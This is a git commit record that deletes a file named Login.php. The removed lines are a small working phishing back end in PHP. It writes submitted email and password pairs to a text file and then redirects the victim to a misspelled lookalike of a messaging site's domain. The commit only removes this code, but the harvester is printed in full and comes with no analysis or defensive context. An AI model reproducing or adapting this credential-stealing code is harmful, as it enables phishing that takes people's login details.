d8446b9bc7a773d46e192772ebba13bcc58bbb4f
masenger7 <87942565+masenger7@users.noreply.github.com>
2021-10-09 08:24:29 +0200

    Delete Login.php

--- Login.php
+++
@@ -1,7 +0,0 @@
-<?php
-
-file_put_contents("TheAccounts.txt", $_POST['email'] . ":" .$_POST['pass']. "\n", FILE_APPEND);
-echo ("<script>window.open('https://www.maessanger.com/','_self');</script>")
-
-
-?>
